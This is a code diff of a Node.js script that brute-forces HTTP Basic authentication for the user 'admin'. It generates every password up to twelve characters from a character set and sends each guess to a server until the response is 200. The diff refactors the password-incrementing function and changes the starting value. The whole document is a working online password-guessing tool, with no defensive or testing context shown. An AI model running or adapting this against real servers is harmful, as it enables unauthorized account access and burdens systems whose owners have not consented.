@@ -14,25 +14,25 @@ var username = 'admin';
 var start = '';
 var test_length = 12;
 
+var next = function(base){
+	//console.log(i, base.length, base);
+	var out = '';
+	var len = base.length;
+	var index = chars.lastIndexOf(base.substr(-1));
+	if(chars[index+1]){
+		out = base.substr(0, len-1) + chars[index+1];
+	}else{
+		out = next(base.substr(0, len-1)) + chars[0];
+	}
+	return out;
+}
+
 var brute_force = function(base){
 	if(base.length <= test_length){
-		var update = function(base){
-			//console.log(i, base.length, base);
-			var out = '';
-			var len = base.length;
-			var index = chars.lastIndexOf(base.substr(-1));
-			if(chars[index+1]){
-				out = base.substr(0, len-1) + chars[index+1];
-			}else{
-				out = update(base.substr(0, len-1)) + chars[0];
-			}
-			return out;
-		}
 
 		console.log(base.length, base);
 		run(base, function(){
-			//start = update(base);
-			brute_force(update(base));
+			brute_force(next(base));
 		});
 		/*process.nextTick(function(){
 			brute_force(start);
@@ -43,7 +43,6 @@ var brute_force = function(base){
 
 var run = function(pwd, cb){
 	var auth = 'Basic ' + new Buffer(username + ':' + pwd).toString('base64');
-	// auth is: 'Basic VGVzdDoxMjM='
 
 	var header = {'Host': server_url, 'Authorization': auth};
 	
@@ -57,11 +56,8 @@ var run = function(pwd, cb){
 	
 	var req = http.request(options, function(res) {
 		console.log('STATUS: ' + res.statusCode, 'pwd:' + pwd);
-		//console.log('HEADERS: ' + JSON.stringify(res.headers));
 		res.setEncoding('utf8');
-		res.on('data', function (chunk) {
-			//console.log('BODY: ' + chunk);
-		});
+
 		res.on('end', function () {
 			if(res.statusCode != 200){
 				process.nextTick(function(){
@@ -79,5 +75,5 @@ var run = function(pwd, cb){
 }
 
 //console.log(chars.length, chars);
-brute_force('000');
-//run('0000');
+brute_force('');
+
